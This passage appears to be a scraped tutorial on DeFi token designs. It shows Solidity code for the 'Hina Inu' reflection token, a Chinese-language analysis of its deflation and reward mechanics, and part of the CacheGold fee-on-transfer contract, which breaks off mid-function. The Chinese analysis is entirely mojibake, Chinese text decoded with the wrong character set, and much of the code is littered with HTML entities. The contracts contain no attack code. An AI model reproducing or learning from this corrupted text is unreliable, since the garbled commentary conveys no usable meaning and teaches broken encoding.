mapping (address => mapping (address => uint256)) private _allowances;\n\n    mapping (address => bool) private _isExcluded;\n    address[] private _excluded;\n   \n    uint256 private constant MAX = ~uint256(0);\n    uint256 private constant _tTotal = 100000000000 * 10**6 * 10**9;\n    uint256 private _rTotal = (MAX - (MAX % _tTotal));\n    uint256 private _tFeeTotal;\n\n    string private _name = 'Hina Inu';\n    string private _symbol = 'HINA';\n    uint8 private _decimals = 9;\n    \n    uint256 public _maxTxAmount = 100000000 * 10**6 * 10**9;\n\n    constructor () public &#123;\n        _rOwned[_msgSender()] = _rTotal;\n        emit Transfer(address(0), _msgSender(), _tTotal);\n    &#125;\n\n    function name() public view returns (string memory) &#123;\n        return _name;\n    &#125;\n\n    function symbol() public view returns (string memory) &#123;\n        return _symbol;\n    &#125;\n\n    function decimals() public view returns (uint8) &#123;\n        return _decimals;\n    &#125;\n\n    function totalSupply() public view override returns (uint256) &#123;\n        return _tTotal;\n    &#125;\n\n    function balanceOf(address account) public view override returns (uint256) &#123;\n        if (_isExcluded[account]) return _tOwned[account];\n        return tokenFromReflection(_rOwned[account]);\n    &#125;\n\n    function transfer(address recipient, uint256 amount) public override returns (bool) &#123;\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    &#125;\n\n    function allowance(address owner, address spender) public view override returns (uint256) &#123;\n        return _allowances[owner][spender];\n    &#125;\n\n    function approve(address spender, uint256 amount) public override returns (bool) &#123;\n        _approve(_msgSender(), spender, amount);\n        return true;\n    &#125;\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) &#123;\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    &#125;\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) &#123;\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    &#125;\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) &#123;\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    &#125;\n\n    function isExcluded(address account) public view returns (bool) &#123;\n        return _isExcluded[account];\n    &#125;\n\n    function totalFees() public view returns (uint256) &#123;\n        return _tFeeTotal;\n    &#125;\n    \n    \n    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() &#123;\n        _maxTxAmount = _tTotal.mul(maxTxPercent).div(\n            10**2\n        );\n    &#125;\n\n    function reflect(uint256 tAmount) public &#123;\n        address sender = _msgSender();\n        require(!_isExcluded[sender], \"Excluded addresses cannot call this function\");\n        (uint256 rAmount,,,,) = _getValues(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _rTotal = _rTotal.sub(rAmount);\n        _tFeeTotal = _tFeeTotal.add(tAmount);\n    &#125;\n\n    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) &#123;\n        require(tAmount &lt;= _tTotal, \"Amount must be less than supply\");\n        if (!deductTransferFee) &#123;\n            (uint256 rAmount,,,,) = _getValues(tAmount);\n            return rAmount;\n        &#125; else &#123;\n            (,uint256 rTransferAmount,,,) = _getValues(tAmount);\n            return rTransferAmount;\n        &#125;\n    &#125;\n\n    function tokenFromReflection(uint256 rAmount) public view returns(uint256) &#123;\n        require(rAmount &lt;= _rTotal, \"Amount must be less than total reflections\");\n        uint256 currentRate =  _getRate();\n        return rAmount.div(currentRate);\n    &#125;\n\n    function excludeAccount(address account) external onlyOwner() &#123;\n        require(!_isExcluded[account], \"Account is already excluded\");\n        if(_rOwned[account] > 0) &#123;\n            _tOwned[account] = tokenFromReflection(_rOwned[account]);\n        &#125;\n        _isExcluded[account] = true;\n        _excluded.push(account);\n    &#125;\n\n    function includeAccount(address account) external onlyOwner() &#123;\n        require(_isExcluded[account], \"Account is already excluded\");\n        for (uint256 i = 0; i &lt; _excluded.length; i++) &#123;\n            if (_excluded[i] == account) &#123;\n                _excluded[i] = _excluded[_excluded.length - 1];\n                _tOwned[account] = 0;\n                _isExcluded[account] = false;\n                _excluded.pop();\n                break;\n            &#125;\n        &#125;\n    &#125;\n\n    function _approve(address owner, address spender, uint256 amount) private &#123;\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    &#125;\n\n    function _transfer(address sender, address recipient, uint256 amount) private &#123;\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        if(sender != owner() &amp;&amp; recipient != owner())\n          require(amount &lt;= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\n            \n        if (_isExcluded[sender] &amp;&amp; !_isExcluded[recipient]) &#123;\n            _transferFromExcluded(sender, recipient, amount);\n        &#125; else if (!_isExcluded[sender] &amp;&amp; _isExcluded[recipient]) &#123;\n            _transferToExcluded(sender, recipient, amount);\n        &#125; else if (!_isExcluded[sender] &amp;&amp; !_isExcluded[recipient]) &#123;\n            _transferStandard(sender, recipient, amount);\n        &#125; else if (_isExcluded[sender] &amp;&amp; _isExcluded[recipient]) &#123;\n            _transferBothExcluded(sender, recipient, amount);\n        &#125; else &#123;\n            _transferStandard(sender, recipient, amount);\n        &#125;\n    &#125;\n\n    function _transferStandard(address sender, address recipient, uint256 tAmount) private &#123;\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       \n        _reflectFee(rFee, tFee);\n        emit Transfer(sender, recipient, tTransferAmount);\n    &#125;\n\n    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private &#123;\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           \n        _reflectFee(rFee, tFee);\n        emit Transfer(sender, recipient, tTransferAmount);\n    &#125;\n\n    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private &#123;\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   \n        _reflectFee(rFee, tFee);\n        emit Transfer(sender, recipient, tTransferAmount);\n    &#125;\n\n    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private &#123;\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);\n        _tOwned[sender] = _tOwned[sender].sub(tAmount);\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\n        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        \n        _reflectFee(rFee, tFee);\n        emit Transfer(sender, recipient, tTransferAmount);\n    &#125;\n\n    function _reflectFee(uint256 rFee, uint256 tFee) private &#123;\n        _rTotal = _rTotal.sub(rFee);\n        _tFeeTotal = _tFeeTotal.add(tFee);\n    &#125;\n\n    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) &#123;\n        (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);\n        uint256 currentRate =  _getRate();\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);\n        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);\n    &#125;\n\n    function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) &#123;\n        uint256 tFee = tAmount.div(100).mul(2);\n        uint256 tTransferAmount = tAmount.sub(tFee);\n        return (tTransferAmount, tFee);\n    &#125;\n\n    function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) &#123;\n        uint256 rAmount = tAmount.mul(currentRate);\n        uint256 rFee = tFee.mul(currentRate);\n        uint256 rTransferAmount = rAmount.sub(rFee);\n        return (rAmount, rTransferAmount, rFee);\n    &#125;\n\n    function _getRate() private view returns(uint256) &#123;\n        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\n        return rSupply.div(tSupply);\n    &#125;\n\n    function _getCurrentSupply() private view returns(uint256, uint256) &#123;\n        uint256 rSupply = _rTotal;\n        uint256 tSupply = _tTotal;      \n        for (uint256 i = 0; i &lt; _excluded.length; i++) &#123;\n            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);\n            rSupply = rSupply.sub(_rOwned[_excluded[i]]);\n            tSupply = tSupply.sub(_tOwned[_excluded[i]]);\n        &#125;\n        if (rSupply &lt; _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\n        return (rSupply, tSupply);\n    &#125;\n&#125;\n\nAnalyzeæ­¤ä»£å¸æœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸€ç§åŸºäºŽ ERC20 åè®®å®žçŽ°çš„ä»£å¸ï¼Œå…¶ä»£å¸å‘è¡Œæ€»é‡ä¸º 1,000,000,000,000,000 æžšï¼Œæ˜¯ä¸€ç§é€šç¼©åˆ†çº¢å¸\né€šç¼©æŒ‡çš„æ˜¯æ¯æ¬¡è½¬è´¦éƒ½ä¼šæ”¶å–ä¸€å®šæ‰‹ç»­è´¹ï¼Œè¿™äº›æ‰‹ç»­è´¹ä¼šç›´æŽ¥é”€æ¯ï¼Œè¿›è€Œå¯¼è‡´æ€»é‡çš„é€šç¼©ï¼Œå³ä»£å¸å¯ä»¥é€šè¿‡é”€æ¯æ¥å¢žåŠ ä»·å€¼ã€‚åˆ†çº¢æŒ‡çš„æ˜¯ï¼Œç”¨æˆ·çš„ä½™é¢ä¼šéšç€å…¶ä»–ç”¨æˆ·è½¬è´¦è€Œå¢žåŠ ã€‚\nç”¨ä¸€ä¸ªæ¯”å–»æ¥è¯´å°±æ˜¯ï¼Œå°†ä¸€å—å›ºå®šè›‹ç³•ï¼ˆ_tTotalï¼‰åˆ†ç»™æ€»é‡ä¼šå˜åŒ–çš„ç›˜å­ä¸­ï¼ˆ_rTotalï¼‰ï¼Œæ¯æ¬¡è½¬è´¦éƒ½ä¼šæ‰“ç¢Žä¸€éƒ¨åˆ†ç›˜å­ï¼Œè¿™æ ·å‰©ä½™ç›˜å­åˆ†åˆ°çš„è›‹ç³•å°±å˜å¤šäº†ã€‚\n_tTotalï¼šæ€»å…±çš„è›‹ç³•\n_rTotalï¼šæ€»å…±çš„ç›˜å­\n_rOwned ï¼šä¸€ä¸ªaccountæŒæœ‰çš„ç›˜å­æ•°é‡\n_tOwned ï¼šåªç”¨äºŽéžåˆ†çº¢ç”¨æˆ·çš„è½¬è´¦\nfunction _transfer(address sender, address recipient, uint256 amount) private &#123;\n       require(sender !&#x3D; address(0), &quot;ERC20: transfer from the zero address&quot;);\n       require(recipient !&#x3D; address(0), &quot;ERC20: transfer to the zero address&quot;);\n       require(amount &gt; 0, &quot;Transfer amount must be greater than zero&quot;);\n       if(sender !&#x3D; owner() &amp;&amp; recipient !&#x3D; owner())\n         require(amount &lt;&#x3D; _maxTxAmount, &quot;Transfer amount exceeds the maxTxAmount.&quot;);\n           \n       if (_isExcluded[sender] &amp;&amp; !_isExcluded[recipient]) &#123;\n           _transferFromExcluded(sender, recipient, amount);\n       &#125; else if (!_isExcluded[sender] &amp;&amp; _isExcluded[recipient]) &#123;\n           _transferToExcluded(sender, recipient, amount);\n       &#125; else if (!_isExcluded[sender] &amp;&amp; !_isExcluded[recipient]) &#123;\n           _transferStandard(sender, recipient, amount);\n       &#125; else if (_isExcluded[sender] &amp;&amp; _isExcluded[recipient]) &#123;\n           _transferBothExcluded(sender, recipient, amount);\n       &#125; else &#123;\n           _transferStandard(sender, recipient, amount);\n       &#125;\n   &#125;\n\næ­¤éƒ¨åˆ†å‡½æ•°åŒºåˆ†äº†å››ç§è½¬è´¦æƒ…å†µï¼š\nâ‘ é»‘åå•è½¬å‘éžé»‘åå•è´¦æˆ·\nâ‘¡éžé»‘åå•è´¦æˆ·è½¬å‘é»‘åå•è´¦æˆ·\nâ‘¢éžé»‘åå•è´¦æˆ·è½¬å‘éžé»‘åå•è´¦æˆ·\nâ‘£é»‘åå•è´¦æˆ·è½¬å‘é»‘åå•å¸æˆ·\nç¬¬ä¸€è¡Œéƒ½ä¼šé€šè¿‡getvalueå‡½æ•°å°†è½¬è´¦ä»£å¸æ•°é¢ ( tAmount ) è½¬æ¢ä¸ºå¥–åŠ±æ•°é¢ ( rAmount ) ä»¥åŠ ä¸€å®šçš„æ‰‹ç»­è´¹æ•°é‡\ntamountçš„2%ä½œä¸ºæƒ©ç½šï¼Œtamount*2%&#x2F;currentrateä½œä¸ºæ‰“ç¢Žçš„ç›˜å­æ•°é‡ï¼Œå³é”€æ¯æ•°é‡\nfunction balanceOf(address account) public view override returns (uint256) &#123;\n     if (_isExcluded[account]) return _tOwned[account];\n     return tokenFromReflection(_rOwned[account]);      //è®¡ç®—towned[acount]\n &#125;\n function tokenFromReflection(uint256 rAmount) public view returns(uint256) &#123;\n     require(rAmount &lt;= _rTotal, \"Amount must be less than total reflections\");\n     uint256 currentRate =  _getRate();\n     return rAmount.div(currentRate);\n &#125;    \n function _getRate() private view returns(uint256) &#123;\n     (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\n     return rSupply.div(tSupply);\n &#125;\n function _reflectFee(uint256 rFee, uint256 tFee) private &#123;\n     _rTotal = _rTotal.sub(rFee);\n     _tFeeTotal = _tFeeTotal.add(tFee);\n &#125;\n function _getCurrentSupply() private view returns(uint256, uint256) &#123;\n     uint256 rSupply = _rTotal;\n     uint256 tSupply = _tTotal;      \n     for (uint256 i = 0; i &lt; _excluded.length; i++) &#123;\n         if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);\n         rSupply = rSupply.sub(_rOwned[_excluded[i]]);\n         tSupply = tSupply.sub(_tOwned[_excluded[i]]);\n     &#125;\n     if (rSupply &lt; _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\n     return (rSupply, tSupply);\n &#125;\n \n\nä»¥ä¸Šå‡½æ•°çš„é…åˆå®žçŽ°äº†é€šè¿‡é”€æ¯ä»£å¸æé«˜ç”¨æˆ·ä½™é¢çš„åŠŸèƒ½ï¼Œå¯ç”¨å¦‚ä¸‹å…¬å¼è¡¨ç¤º\ntOwned[account] &#x3D; rOwned[account] &#x2F; rSupply * tSupply\nå…¶ä¸­rSupply éšäº¤æ˜“æ•°é‡å¢žåŠ è€Œå‡å°‘ï¼Œåˆ†æ¯å˜å°ï¼Œbalanceå˜å¤§\nä»¥ä¸‹å‡½æ•°å®žçŽ°äº†é»‘åå•çš„å¢žåˆ åŠŸèƒ½\nfunction excludeAccount(address account) external onlyOwner() &#123;\n    require(!_isExcluded[account], \"Account is already excluded\");\n    if(_rOwned[account] > 0) &#123;\n        _tOwned[account] = tokenFromReflection(_rOwned[account]);\n    &#125;\n    _isExcluded[account] = true;\n    _excluded.push(account);\n&#125;\n\nfunction includeAccount(address account) external onlyOwner() &#123;\n    require(_isExcluded[account], \"Account is already excluded\");\n    for (uint256 i = 0; i &lt; _excluded.length; i++) &#123;\n        if (_excluded[i] == account) &#123;\n            _excluded[i] = _excluded[_excluded.length - 1];\n            _tOwned[account] = 0;\n            _isExcluded[account] = false;\n            _excluded.pop();\n            break;\n        &#125;\n    &#125;\n&#125;\n\n3.Fee on Transfer TokenCodepragma solidity 0.5.16;\ncontract Ownable &#123;\n    address private _owner;\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n    constructor () internal &#123;\n        _owner = msg.sender;\n        emit OwnershipTransferred(address(0), _owner);\n    &#125;\n    function owner() public view returns (address) &#123;\n        return _owner;\n    &#125;\n    modifier onlyOwner() &#123;\n        require(isOwner(), \"Ownable: caller is not the owner\");\n        _;\n    &#125;\n    function isOwner() public view returns (bool) &#123;\n        return msg.sender == _owner;\n    &#125;\n    function renounceOwnership() public onlyOwner &#123;\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    &#125;\n    function transferOwnership(address newOwner) public onlyOwner &#123;\n        _transferOwnership(newOwner);\n    &#125;\n    function _transferOwnership(address newOwner) internal &#123;\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    &#125;\n&#125;\ninterface IERC20 &#123;\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a `Transfer` event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through `transferFrom`. This is\n     * zero by default.\n     *\n     * This value changes when `approve` or `transferFrom` are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * > Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an `Approval` event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a `Transfer` event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to `approve`. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n&#125;\nlibrary SafeMath &#123;\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n        return c;\n    &#125;\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        require(b &lt;= a, \"SafeMath: subtraction overflow\");\n        uint256 c = a - b;\n        return c;\n    &#125;\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n        if (a == 0) &#123;\n            return 0;\n        &#125;\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    &#125;\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        // Solidity only automatically asserts when dividing by 0\n        require(b > 0, \"SafeMath: division by zero\");\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n        return c;\n    &#125;\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        require(b != 0, \"SafeMath: modulo by zero\");\n        return a % b;\n    &#125;\n&#125;\ncontract LockedGoldOracle is Ownable &#123;\n  using SafeMath for uint256;\n  uint256 private _lockedGold;\n  address private _cacheContract;\n  event LockEvent(uint256 amount);\n  event UnlockEvent(uint256 amount);\n  function setCacheContract(address cacheContract) external onlyOwner &#123;\n    _cacheContract = cacheContract;\n  &#125;\n  function lockAmount(uint256 amountGrams) external onlyOwner &#123;\n    _lockedGold = _lockedGold.add(amountGrams);\n    emit LockEvent(amountGrams);\n  &#125;\n  function unlockAmount(uint256 amountGrams) external onlyOwner &#123;\n    _lockedGold = _lockedGold.sub(amountGrams);\n    require(_lockedGold >= CacheGold(_cacheContract).totalCirculation());\n    emit UnlockEvent(amountGrams);\n  &#125;\n  function lockedGold() external view returns(uint256) &#123;\n    return _lockedGold;\n  &#125;\n  function cacheContract() external view returns(address) &#123;\n    return _cacheContract;\n  &#125;\n&#125;\ncontract CacheGold is IERC20, Ownable &#123;\n  using SafeMath for uint256;\n  string public constant name = \"CACHE Gold\";\n  string public constant symbol = \"CGT\";\n  uint8 public constant decimals = 8;\n  uint256 private constant TOKEN = 10 ** uint256(decimals);\n  // Seconds in a day\n  uint256 private constant DAY = 86400;\n  // Days in a year\n  uint256 private constant YEAR = 365;\n  // The maximum transfer fee is 10 basis points\n  uint256 private constant MAX_TRANSFER_FEE_BASIS_POINTS = 10;\n  // Basis points means divide by 10,000 to get decimal\n  uint256 private constant BASIS_POINTS_MULTIPLIER = 10000;\n  // The storage fee of 0.25%\n  uint256 private constant STORAGE_FEE_DENOMINATOR = 40000000000;\n  // The inactive fee of 0.50%\n  uint256 private constant INACTIVE_FEE_DENOMINATOR = 20000000000;\n  // The minimum balance that would accrue a storage fee after 1 day\n  uint256 private constant MIN_BALANCE_FOR_FEES = 146000;\n  // Initial basis points for transfer fee\n  uint256 private _transferFeeBasisPoints = 10;\n  // Cap on total number of tokens that can ever be produced\n  uint256 public constant SUPPLY_CAP = 8133525786 * TOKEN;\n  // How many days need to pass before late fees can be collected (3 years)\n  uint256 public constant INACTIVE_THRESHOLD_DAYS = 1095;\n  // Token balance of each address\n  mapping (address => uint256) private _balances;\n  // Allowed transfer from address\n  mapping (address => mapping (address => uint256)) private _allowances;\n  // Last time storage fee was paid\n  mapping (address => uint256) private _timeStorageFeePaid;\n  // Last time the address produced a transaction on this contract\n  mapping (address => uint256) private _timeLastActivity;\n  // Amount of inactive fees already paid\n  mapping (address => uint256) private _inactiveFeePaid;\n  // If address doesn't have any activity for INACTIVE_THRESHOLD_DAYS\n  // we can start deducting chunks off the address so that\n  // full balance can be recouped after 200 years. This is likely\n  // to happen if the user loses their private key.\n  mapping (address => uint256) private _inactiveFeePerYear;\n  // Addresses not subject to transfer fees\n  mapping (address => bool) private _transferFeeExempt;\n  // Address is not subject to storage fees\n  mapping (address => bool) private _storageFeeExempt;\n  // Save grace period on storage fees for an address\n  mapping (address => uint256) private _storageFeeGracePeriod;\n  // Current total number of tokens created\n  uint256 private _totalSupply;\n  // Address where storage and transfer fees are collected\n  address private _feeAddress;\n  // The address for the \"backed treasury\". When a bar is locked into the\n  // vault for tokens to be minted, they are created in the backed_treasury\n  // and can then be sold from this address.\n  address private _backedTreasury;\n  // The address for the \"unbacked treasury\". The unbacked treasury is a\n  // storing address for excess tokens that are not locked in the vault\n  // and therefore do not correspond to any real world value. If new bars are\n  // locked in the vault, tokens will first be moved from the unbacked\n  // treasury to the backed treasury before minting new tokens.\n  //\n  // This address only accepts transfers from the _backedTreasury or _redeemAddress\n  // the general public should not be able to manipulate this balance.\n  address private _unbackedTreasury;\n  // The address for the LockedGoldOracle that determines the maximum number of\n  // tokens that can be in circulation at any given time\n  address private _oracle;\n  // A fee-exempt address that can be used to collect gold tokens in exchange\n  // for redemption of physical gold\n  address private _redeemAddress;\n  // An address that can force addresses with overdue storage or inactive fee to pay.\n  // This is separate from the contract owner, because the owner will change\n  // to a multisig address after deploy, and we want to be able to write\n  // a script that can sign \"force-pay\" transactions with a single private key\n  address private _feeEnforcer;\n  // Grace period before storage fees kick in\n  uint256 private _storageFeeGracePeriodDays = 0;\n  // When gold bars are locked, we add tokens to circulation either\n  // through moving them from the unbacked treasury or minting new ones,\n  // or some combination of both\n  event AddBackedGold(uint256 amount);\n  // Before gold bars can be unlocked (removed from circulation), they must\n  // be moved to the unbacked treasury, we emit an event when this happens\n  // to signal a change in the circulating supply\n  event RemoveGold(uint256 amount);\n  // When an account has no activity for INACTIVE_THRESHOLD_DAYS\n  // it will be flagged as inactive\n  event AccountInactive(address indexed account, uint256 feePerYear);\n  // If an previoulsy dormant account is reactivated\n  event AccountReActive(address indexed account);\n  /**\n   * @dev Contructor for the CacheGold token sets internal addresses\n   * @param unbackedTreasury The address of the unbacked treasury\n   * @param backedTreasury The address of the backed treasury\n   * @param feeAddress The address where fees are collected\n   * @param redeemAddress The address where tokens are send to redeem physical gold\n   * @param oracle The address of the LockedGoldOracle\n   */\n  constructor(address unbackedTreasury,\n              address backedTreasury,\n              address feeAddress,\n              address redeemAddress,\n              address oracle) public &#123;\n    _unbackedTreasury = unbackedTreasury;\n    _backedTreasury = backedTreasury;\n    _feeAddress = feeAddress;\n    _redeemAddress = redeemAddress;\n    _feeEnforcer = owner();\n    _oracle = oracle;\n    setFeeExempt(_feeAddress);\n    setFeeExempt(_redeemAddress);\n    setFeeExempt(_backedTreasury);\n    setFeeExempt(_unbackedTreasury);\n    setFeeExempt(owner());\n  &#125;\n  /**\n   * @dev Throws if called by any account other than THE ENFORCER\n   */\n  modifier onlyEnforcer() &#123;\n    require(msg.sender == _feeEnforcer);\n    _;\n  &#125;\n  /**\n  * @dev Transfer token for a specified address\n  * @param to The address to transfer to.\n  * @param value The amount to be transferred.\n  */\n  function transfer(address to, uint256 value) external returns (bool) &#123;\n    // Update activity for the sender\n    _updateActivity(msg.sender);\n    // Can opportunistically mark an account inactive if someone\n    // sends money to it\n    if (_shouldMarkInactive(to)) &#123;\n      _setInactive(to);\n    &#125;\n    _transfer(msg.sender, to, value);\n    return true;\n  &#125;\n  /**\n  * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\n  * Beware that changing an allowance with this method brings the risk that someone may use both the old\n  * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\n  * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:\n  * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n  * @param spender The address which will spend the funds.\n  * @param value The amount of tokens to be spent.\n  */\n  function approve(address spender, uint256 value) external returns (bool) &#123;\n    _updateActivity(msg.sender);\n    _approve(msg.sender, spender, value);\n    return true;\n  &#125;\n  /**\n  * @dev Transfer tokens from one address to another.\n  * Note that while this function emits an Approval event, this is not required as per the specification,\n  * and other compliant implementations may not emit the event.\n  * Also note that even though balance requirements are not explicitly checked,\n  * any transfer attempt over the approved amount will automatically fail due to\n  * SafeMath revert when trying to subtract approval to a negative balance\n  * @param from address The address which you want to send tokens from\n  * @param to address The address which you want to transfer to\n  * @param value uint256 the amount of tokens to be transferred\n  */\n  function transferFrom(address from, address to, uint256 value) external returns (bool) &#123;\n    _updateActivity(msg.sender);\n    _transfer(from, to, value);\n    _approve(from, msg.sender, _allowances[from][msg.sender].sub(value));\n    return true;\n  &#125;\n  /**\n  * @dev Increase the amount of tokens that an owner allowed to a spender.\n  * approve should be called when allowed_[_spender] == 0. To increment\n  * allowed value is better to use this function to avoid 2 calls (and wait until\n  * the first transaction is mined)\n  * From MonolithDAO Token.sol\n  * Emits an Approval event.\n  * @param spender The address which will spend the funds.\n  * @param addedValue The amount of tokens to increase the allowance by.\n  */\n  function increaseAllowance(address spender, uint256 addedValue) external returns (bool) &#123;\n    _updateActivity(msg.sender);\n    _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\n    return true;\n  &#125;\n  /**\n  * @dev Decrease the amount of tokens that an owner allowed to a spender.\n  * approve should be called when allowed_[_spender] == 0. To decrement\n  * allowed value is better to use this function to avoid 2 calls (and wait until\n  * the first transaction is mined)\n  * From MonolithDAO Token.sol\n  * Emits an Approval event.\n  * @param spender The address which will spend the funds.\n  * @param subtractedValue The amount of tokens to decrease the allowance by.\n  */\n  function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) &#123;\n    _updateActivity(msg.sender);\n    _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));\n    return 